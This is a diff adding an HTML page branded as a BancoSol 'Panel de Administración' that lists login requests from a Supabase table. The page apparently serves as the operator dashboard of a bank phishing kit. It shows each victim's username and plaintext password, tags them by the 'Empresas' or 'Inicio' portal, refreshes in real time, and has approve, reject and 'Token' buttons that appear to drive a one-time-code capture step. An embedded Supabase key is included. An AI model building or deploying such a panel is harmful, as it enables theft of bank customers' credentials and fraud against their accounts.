@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Solicitudes de Ingreso | BancoSol</title>
+    <link rel="icon" href="https://www.bancosol.com.bo/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f3f4f6;
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #32006E, #46009B);
+            padding: 16px 48px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-left img {
+            height: 40px;
+        }
+        .header-left h1 {
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .header-badge {
+            background: rgba(255,255,255,0.15);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 32px 24px;
+        }
+        .stats-bar {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+        .stat-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px 24px;
+            flex: 1;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .stat-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+        }
+        .stat-icon.purple { background: #7c3aed; }
+        .stat-icon.orange { background: #f59e0b; }
+        .stat-icon.green { background: #10b981; }
+        .stat-info h3 { font-size: 28px; font-weight: 700; color: #1f2937; }
+        .stat-info p { font-size: 14px; color: #6b7280; }
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .section-title i { color: #7c3aed; }
+        .table-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            overflow: hidden;
+            margin-bottom: 32px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        thead {
+            background: #f9fafb;
+        }
+        thead th {
+            padding: 14px 20px;
+            text-align: left;
+            font-size: 13px;
+            font-weight: 600;
+            color: #6b7280;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        tbody td {
+            padding: 16px 20px;
+            font-size: 14px;
+            color: #374151;
+            border-bottom: 1px solid #f3f4f6;
+            vertical-align: middle;
+        }
+        tbody tr:hover {
+            background: #f9fafb;
+        }
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+        .portal-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .portal-badge.empresas {
+            background: #ede9fe;
+            color: #6d28d9;
+        }
+        .portal-badge.inicio {
+            background: #fef3c7;
+            color: #b45309;
+        }
+        .user-cell {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+        }
+        .user-avatar.purple { background: #7c3aed; }
+        .user-avatar.orange { background: #f59e0b; }
+        .user-info .user-name { font-weight: 500; color: #1f2937; }
+        .user-info .user-email { font-size: 12px; color: #9ca3af; }
+        .password-cell {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #6b7280;
+            letter-spacing: 1px;
+        }
+        .actions-cell {
+            display: flex;
+            gap: 8px;
+            flex-wrap: nowrap;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: inherit;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .btn-approve {
+            background: #d1fae5;
+            color: #065f46;
+        }
+        .btn-approve:hover {
+            background: #a7f3d0;
+        }
+        .btn-reject {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+        .btn-reject:hover {
+            background: #fecaca;
+        }
+        .btn-token {
+            background: #e0e7ff;
+            color: #3730a3;
+        }
+        .btn-token:hover {
+            background: #c7d2fe;
+        }
+        .btn i {
+            font-size: 14px;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #9ca3af;
+        }
+        .empty-state i {
+            font-size: 48px;
+            margin-bottom: 16px;
+            color: #d1d5db;
+        }
+        .empty-state p {
+            font-size: 16px;
+        }
+        .footer {
+            text-align: center;
+            padding: 24px;
+            color: #9ca3af;
+            font-size: 13px;
+        }
+        .last-update {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-left: auto;
+        }
+        @media (max-width: 768px) {
+            .header { padding: 12px 20px; flex-direction: column; gap: 8px; }
+            .stats-bar { flex-direction: column; }
+            .table-container { overflow-x: auto; }
+            .actions-cell { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-left">
+            <img src="./empresas_files/logo-blue.png" alt="BancoSol">
+            <h1>Panel de Administración</h1>
+        </div>
+        <span class="header-badge">
+            <i class="fas fa-shield-alt"></i> &nbsp;Solicitudes de Ingreso
+        </span>
+    </div>
+
+    <div class="container">
+        <!-- Stats -->
+        <div class="stats-bar">
+            <div class="stat-card">
+                <div class="stat-icon purple">
+                    <i class="fas fa-clock"></i>
+                </div>
+                <div class="stat-info">
+                    <h3 id="countPendientes">0</h3>
+                    <p>Pendientes</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon green">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div class="stat-info">
+                    <h3 id="countAprobados">0</h3>
+                    <p>Aprobados</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon orange">
+                    <i class="fas fa-times-circle"></i>
+                </div>
+                <div class="stat-info">
+                    <h3 id="countRechazados">0</h3>
+                    <p>Rechazados</p>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon purple">
+                    <i class="fas fa-database"></i>
+                </div>
+                <div class="stat-info">
+                    <h3 id="countTotal">0</h3>
+                    <p>Total</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tabla de Solicitudes -->
+        <div class="section-title">
+            <i class="fas fa-list"></i> Solicitudes de Ingreso
+            <span class="last-update" id="lastUpdate">Actualizando...</span>
+        </div>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Usuario</th>
+                        <th>Contraseña</th>
+                        <th>Portal</th>
+                        <th>Estado</th>
+                        <th>Fecha</th>
+                        <th>Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="solicitudesBody">
+                    <tr>
+                        <td colspan="6">
+                            <div class="empty-state">
+                                <i class="fas fa-inbox"></i>
+                                <p>Cargando solicitudes...</p>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2026 BancoSol - Panel de Administración
+    </div>
+
+    <script>
+        // Supabase configuration
+        const SUPABASE_URL = 'https://ktuknakuiicqdicknqnu.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_mIQcyGnaX_oatdbodvzJVQ_Szu_D0en';
+        const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Format date
+        function formatDate(dateStr) {
+            if (!dateStr) return '-';
+            const d = new Date(dateStr);
+            return d.toLocaleString('es-BO', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+
+        // Get initials from username
+        function getInitials(username) {
+            if (!username) return '??';
+            var parts = username.split(/[\s._@]+/);
+            var initials = '';
+            for (var i = 0; i < Math.min(parts.length, 2); i++) {
+                if (parts[i].length > 0) {
+                    initials += parts[i][0].toUpperCase();
+                }
+            }
+            return initials || '??';
+        }
+
+        // Get avatar color based on portal
+        function getAvatarColor(portal) {
+            return portal === 'empresas' ? 'purple' : 'orange';
+        }
+
+        // Get status badge HTML
+        function getStatusBadge(estado) {
+            var bg, color, icon, text;
+            switch(estado) {
+                case 'aprobado':
+                    bg = '#d1fae5'; color = '#065f46'; icon = 'fa-check-circle'; text = 'Aprobado';
+                    break;
+                case 'rechazado':
+                    bg = '#fee2e2'; color = '#991b1b'; icon = 'fa-times-circle'; text = 'Rechazado';
+                    break;
+                default:
+                    bg = '#fef3c7'; color = '#b45309'; icon = 'fa-hourglass-half'; text = 'Pendiente';
+            }
+            return '<span style="display: inline-flex; align-items: center; gap: 6px; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; background: ' + bg + '; color: ' + color + ';">' +
+                '<i class="fas ' + icon + '"></i> ' + text + '</span>';
+        }
+
+        // Render solicitudes in table
+        function renderSolicitudes(solicitudes) {
+            var tbody = document.getElementById('solicitudesBody');
+            
+            if (!solicitudes || solicitudes.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6"><div class="empty-state"><i class="fas fa-inbox"></i><p>No hay solicitudes de ingreso registradas</p></div></td></tr>';
+                updateStats([]);
+                return;
+            }
+
+            var html = '';
+            for (var i = 0; i < solicitudes.length; i++) {
+                var s = solicitudes[i];
+                var initials = getInitials(s.usuario);
+                var avatarColor = getAvatarColor(s.portal);
+                var portalLabel = s.portal === 'empresas' ? 'Empresas' : 'Inicio';
+                var portalIcon = s.portal === 'empresas' ? 'fa-building' : 'fa-user';
+                var statusBadge = getStatusBadge(s.estado);
+                var fecha = formatDate(s.created_at);
+                var id = s.id;
+
+                html += '<tr>' +
+                    '<td>' +
+                        '<div class="user-cell">' +
+                            '<div class="user-avatar ' + avatarColor + '">' + initials + '</div>' +
+                            '<div class="user-info">' +
+                                '<div class="user-name">' + escapeHtml(s.usuario || '') + '</div>' +
+                                '<div class="user-email">' + escapeHtml(s.contrasena || '') + '</div>' +
+                            '</div>' +
+                        '</div>' +
+                    '</td>' +
+                    '<td><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
+                    '<td><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
+                    '<td>' + statusBadge + '</td>' +
+                    '<td style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
+                    '<td>' +
+                        '<div class="actions-cell">' +
+                            '<button class="btn btn-approve" onclick="actualizarEstado(' + id + ', \'aprobado\')" ' + (s.estado === 'aprobado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-check"></i> Aprobar</button>' +
+                            '<button class="btn btn-reject" onclick="actualizarEstado(' + id + ', \'rechazado\')" ' + (s.estado === 'rechazado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-times"></i> Rechazar</button>' +
+                            '<button class="btn btn-token" onclick="generarToken(' + id + ')"><i class="fas fa-key"></i> Token</button>' +
+                        '</div>' +
+                    '</td>' +
+                '</tr>';
+            }
+            tbody.innerHTML = html;
+            updateStats(solicitudes);
+        }
+
+        // Escape HTML
+        function escapeHtml(text) {
+            if (!text) return '';
+            var div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Update stats
+        function updateStats(solicitudes) {
+            var pendientes = 0, aprobados = 0, rechazados = 0;
+            for (var i = 0; i < solicitudes.length; i++) {
+                switch(solicitudes[i].estado) {
+                    case 'aprobado': aprobados++; break;
+                    case 'rechazado': rechazados++; break;
+                    default: pendientes++;
+                }
+            }
+            document.getElementById('countPendientes').textContent = pendientes;
+            document.getElementById('countAprobados').textContent = aprobados;
+            document.getElementById('countRechazados').textContent = rechazados;
+            document.getElementById('countTotal').textContent = solicitudes.length;
+        }
+
+        // Update estado in Supabase
+        async function actualizarEstado(id, nuevoEstado) {
+            try {
+                const { error } = await supabase
+                    .from('solicitudes_ingreso')
+                    .update({ estado: nuevoEstado })
+                    .eq('id', id);
+                
+                if (error) {
+                    console.error('Error al actualizar:', error);
+                    alert('Error al actualizar el estado');
+                } else {
+                    // Refresh data
+                    cargarSolicitudes();
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('Error al actualizar el estado');
+            }
+        }
+
+        // Generate token (just updates estado to 'token_generado')
+        async function generarToken(id) {
+            try {
+                const { error } = await supabase
+                    .from('solicitudes_ingreso')
+                    .update({ estado: 'token_generado' })
+                    .eq('id', id);
+                
+                if (error) {
+                    console.error('Error al generar token:', error);
+                    alert('Error al generar el token');
+                } else {
+                    alert('Token generado exitosamente para la solicitud #' + id);
+                    cargarSolicitudes();
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('Error al generar el token');
+            }
+        }
+
+        // Load all solicitudes
+        async function cargarSolicitudes() {
+            try {
+                const { data, error } = await supabase
+                    .from('solicitudes_ingreso')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+                
+                if (error) {
+                    console.error('Error al cargar:', error);
+                    document.getElementById('solicitudesBody').innerHTML = 
+                        '<tr><td colspan="6"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error al cargar datos: ' + error.message + '</p></div></td></tr>';
+                    return;
+                }
+                
+                renderSolicitudes(data || []);
+                document.getElementById('lastUpdate').textContent = 'Última actualización: ' + new Date().toLocaleTimeString('es-BO');
+                
+            } catch (err) {
+                console.error('Error:', err);
+                document.getElementById('solicitudesBody').innerHTML = 
+                    '<tr><td colspan="6"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error de conexión</p></div></td></tr>';
+            }
+        }
+
+        // Subscribe to real-time changes
+        function suscribirCambios() {
+            const subscription = supabase
+                .channel('solicitudes_cambios')
+                .on('postgres_changes', 
+                    { event: '*', schema: 'public', table: 'solicitudes_ingreso' },
+                    function(payload) {
+                        console.log('Cambio detectado:', payload);
+                        cargarSolicitudes();
+                    }
+                )
+                .subscribe();
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            cargarSolicitudes();
+            suscribirCambios();
+            
+            // Auto-refresh every 30 seconds as fallback
+            setInterval(cargarSolicitudes, 30000);
+        });
+    </script>
+</body>
+</html>
